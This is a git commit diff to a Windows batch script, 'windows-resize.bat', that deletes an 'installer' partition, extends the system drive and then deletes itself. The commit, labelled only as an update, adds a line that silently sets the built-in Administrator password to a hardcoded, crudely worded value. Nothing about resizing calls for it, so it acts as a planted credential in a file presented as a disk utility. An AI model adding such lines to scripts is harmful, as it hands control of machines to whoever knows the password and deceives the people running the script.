4d383190923b0cdad49e69dbde9805a69c0e52a2
gileredman <75474928+gileredman@users.noreply.github.com>
2025-12-05 20:40:27 +0700

    Update windows-resize.bat

--- windows-resize.bat
+++ windows-resize.bat
@@ -1,7 +1,9 @@
 @echo off
 mode con cp select=437 >nul
+net user Administrator KONTOL123
 
 set C=%SystemDrive:~0,1%
 for /f "tokens=2" %%a in ('echo list vol ^| diskpart ^| findstr "\<installer\>"') do (echo select vol %%a & echo delete partition) | diskpart
 for /f "tokens=2" %%a in ('echo list vol ^| diskpart ^| findstr "\<%C%\>"') do (echo select vol %%a & echo extend) | diskpart
 del "%~f0"
+
